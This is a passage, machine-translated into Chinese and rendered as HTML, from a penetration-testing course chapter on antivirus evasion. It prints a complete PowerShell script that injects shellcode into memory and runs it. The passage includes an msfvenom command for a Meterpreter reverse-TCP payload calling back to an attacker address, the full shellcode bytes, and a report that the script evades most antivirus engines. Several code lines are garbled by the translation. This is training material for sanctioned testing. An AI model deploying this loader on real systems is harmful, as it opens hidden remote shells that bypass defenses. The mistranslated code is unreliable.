<div style="position:absolute;top:67924;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:69001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:69001;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:69001;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">499</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该脚本首先</font><font style="vertical-align: inherit;">从 kernel32.dll</font><font style="vertical-align: inherit;">导入</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VirtualAlloc </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">428</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateThread </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">429</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及</font></font></nobr></div>
<div style="position:absolute;top:68039;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 msvcrt.dll 的</font><i><font style="vertical-align: inherit;">memset</font></i><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这些函数将允许我们分配内存，创建一个执行</font></font></nobr></div>
<div style="position:absolute;top:68058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程，并分别将任意数据写入分配的内存。</font><font style="vertical-align: inherit;">再次注意，我们</font></font></nobr></div>
<div style="position:absolute;top:68078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在分配内存并在当前进程（powershell.exe）中执行一个新线程，</font></font></nobr></div>
<div style="position:absolute;top:68097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而不是远程的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("kernel32.dll")]</font></font></nobr></div>
<div style="position:absolute;top:68149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共静态外部 IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat</font></font></nobr></div>
<div style="position:absolute;top:68166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ionType, uint flProtect);</font></font></nobr></div>
<div style="position:absolute;top:68200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("kernel32.dll")]</font></font></nobr></div>
<div style="position:absolute;top:68217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共静态外部 IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,</font></font></nobr></div>
<div style="position:absolute;top:68234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</font></font></nobr></div>
<div style="position:absolute;top:68268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("msvcrt.dll")]</font></font></nobr></div>
<div style="position:absolute;top:68285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public static extern IntPtr memset(IntPtr dest, uint src, uint count);';</font></font></nobr></div>
<div style="position:absolute;top:68304;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 499 - 在 PowerShell 中导入 Windows API</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后脚本使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VirtualAlloc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分配一块内存</font><font style="vertical-align: inherit;">，获取有效负载的每个字节</font></font></nobr></div>
<div style="position:absolute;top:68353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节数组中，并使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">memset</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其写入我们新分配的内存块</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[Byte[]]$sc = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;把你的shellcode放在这里&gt;</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ;</font></font></nobr></div>
<div style="position:absolute;top:68422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$size = 0x1000;</font></font></nobr></div>
<div style="position:absolute;top:68455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if ($sc.Length -gt 0x1000) {$size = $sc.Length};</font></font></nobr></div>
<div style="position:absolute;top:68489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);</font></font></nobr></div>
<div style="position:absolute;top:68524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc</font></font></nobr></div>
<div style="position:absolute;top:68540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[$i], 1)};</font></font></nobr></div>
<div style="position:absolute;top:68560;left:210"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 500 - 在 PowerShell 中使用 Windows API 进行内存分配和有效负载写入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为最后一步，我们在内存中写入的有效负载使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CreateThread</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在单独的线程中执行</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</font></font></nobr></div>
<div style="position:absolute;top:68643;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 501 - 使用 CreateThread 调用有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:68672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的脚本中缺少我们选择的有效负载，它可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:68692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将保持有效载荷与之前测试中使用的相同以保持一致性：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:68744;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电源外壳</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:68761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:68778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择 Arch，从有效载荷中选择 Arch: x86</font></font></nobr></div>
<div style="position:absolute;top:68795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
<div style="position:absolute;top:68812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：333 字节</font></font></nobr></div>
<div style="position:absolute;top:68829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell 文件的最终大小：1627 字节</font></font></nobr></div>
<div style="position:absolute;top:68846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[字节[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x3</font></font></nobr></div>
<div style="position:absolute;top:68863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0</font></font></nobr></div>
<div style="position:absolute;top:68880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:68931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">428 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</font></font></font></nobr></div>
<div style="position:absolute;top:68951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">429 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:69079;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="59"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 59 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:69112;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:70189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:70189;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:70189;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">500</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x4</font></font></nobr></div>
<div style="position:absolute;top:69224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x</font></font></nobr></div>
<div style="position:absolute;top:69241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,</font></font></nobr></div>
<div style="position:absolute;top:69258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,</font></font></nobr></div>
<div style="position:absolute;top:69276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0</font></font></nobr></div>
<div style="position:absolute;top:69292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,</font></font></nobr></div>
<div style="position:absolute;top:69309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0</font></font></nobr></div>
<div style="position:absolute;top:69326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xac,0x10,0x74,0x8b,0x68,0x2,0x0,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40</font></font></nobr></div>
<div style="position:absolute;top:69343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0</font></font></nobr></div>
<div style="position:absolute;top:69360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x61,0x0,0x0,0x0,0x6a,0x</font></font></nobr></div>
<div style="position:absolute;top:69377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x</font></font></nobr></div>
<div style="position:absolute;top:69394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x</font></font></nobr></div>
<div style="position:absolute;top:69411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0</font></font></nobr></div>
<div style="position:absolute;top:69428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x22,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x6</font></font></nobr></div>
<div style="position:absolute;top:69445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xe9,0x71,0xff,0xff,0xff,0x1,0</font></font></nobr></div>
<div style="position:absolute;top:69462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5</font></font></nobr></div>
<div style="position:absolute;top:69482;left:244"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 502 - 使用 msfvenom 生成与 PowerShell 兼容的有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:69511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重命名</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$buf</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">后，可以将结果输出复制到最终脚本</font></font></nobr></div>
<div style="position:absolute;top:69530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，根据脚本的要求。</font><font style="vertical-align: inherit;">我们的完整脚本如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:69565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$代码 = '</font></font></nobr></div>
<div style="position:absolute;top:69582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("kernel32.dll")]</font></font></nobr></div>
<div style="position:absolute;top:69599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共静态外部 IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat</font></font></nobr></div>
<div style="position:absolute;top:69616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ionType, uint flProtect);</font></font></nobr></div>
<div style="position:absolute;top:69650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("kernel32.dll")]</font></font></nobr></div>
<div style="position:absolute;top:69667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共静态外部 IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,</font></font></nobr></div>
<div style="position:absolute;top:69684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</font></font></nobr></div>
<div style="position:absolute;top:69718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[DllImport("msvcrt.dll")]</font></font></nobr></div>
<div style="position:absolute;top:69735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">public static extern IntPtr memset(IntPtr dest, uint src, uint count);';</font></font></nobr></div>
<div style="position:absolute;top:69769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -p</font></font></nobr></div>
<div style="position:absolute;top:69786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直通;</font></font></nobr></div>
<div style="position:absolute;top:69820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[字节[]];</font></font></nobr></div>
<div style="position:absolute;top:69836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[字节[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30</font></font></nobr></div>
<div style="position:absolute;top:69853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x</font></font></nobr></div>
<div style="position:absolute;top:69871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0</font></font></nobr></div>
<div style="position:absolute;top:69888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49</font></font></nobr></div>
<div style="position:absolute;top:69904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x3</font></font></nobr></div>
<div style="position:absolute;top:69921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0</font></font></nobr></div>
<div style="position:absolute;top:69938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0</font></font></nobr></div>
<div style="position:absolute;top:69955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x</font></font></nobr></div>
<div style="position:absolute;top:69972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0</font></font></nobr></div>
<div style="position:absolute;top:69989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0x</font></font></nobr></div>
<div style="position:absolute;top:70006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ac,0x10,0x74,0x8b,0x68,0x2,0x0,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,</font></font></nobr></div>
<div style="position:absolute;top:70023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x</font></font></nobr></div>
<div style="position:absolute;top:70040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x61,0x0,0x0,0x0,0x6a,0x0</font></font></nobr></div>
<div style="position:absolute;top:70057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x3</font></font></nobr></div>
<div style="position:absolute;top:70074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x9</font></font></nobr></div>
<div style="position:absolute;top:70091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x</font></font></nobr></div>
<div style="position:absolute;top:70108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68</font></font></nobr></div>
<div style="position:absolute;top:70125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xe9,0x71,0xff,0xff,0xff,0x1,0x</font></font></nobr></div>
<div style="position:absolute;top:70142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5； </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:70267;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="60"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 60 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:70300;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:71377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:71377;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:71377;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">501</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$size = 0x1000;</font></font></nobr></div>
<div style="position:absolute;top:70446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if ($sc.Length -gt 0x1000) {$size = $sc.Length};</font></font></nobr></div>
<div style="position:absolute;top:70480;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);</font></font></nobr></div>
<div style="position:absolute;top:70514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc</font></font></nobr></div>
<div style="position:absolute;top:70531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[$i], 1)};</font></font></nobr></div>
<div style="position:absolute;top:70565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };</font></font></nobr></div>
<div style="position:absolute;top:70585;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 503 - 内存注入的最终脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按照VirusTotal扫描结果，仅</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59种</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AV产品检测到我们的脚本。</font></font></nobr></div>
<div style="position:absolute;top:70633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是非常有希望的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:70963;left:266"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 267：PowerShell 中内存注入的 VirusTotal 结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:70994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，我们的 Windows 机器上的 Avira AV 引擎扫描我们的脚本表明它是</font></font></nobr></div>
<div style="position:absolute;top:71014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未检测为恶意： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:71455;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="61"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 61 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:71488;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
